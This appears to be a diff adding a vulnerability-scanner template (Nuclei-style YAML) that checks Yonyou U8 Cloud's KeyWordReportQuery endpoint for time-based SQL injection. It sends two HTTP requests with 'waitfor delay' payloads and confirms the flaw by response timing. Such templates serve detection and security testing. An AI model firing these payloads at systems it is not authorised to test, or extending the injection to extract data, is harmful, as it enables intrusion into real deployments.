@@ -1,0 +1,41 @@
+id: poc-yaml-yongyou-u8-cloud-keywordreportquery-sqli
+info:
+  name: "用友 U8 Cloud KeyWordReportQuery 接口 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: yongyou-u8-cloud
+
+http:
+  - raw:
+      - |
+        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"reportType":"1';waitfor delay '0:0:5'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
+      - |
+        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"reportType":"1';waitfor delay '0:0:8'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+        negative: false
+      - type: word
+        part: body
+        words:
+          - '<'
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
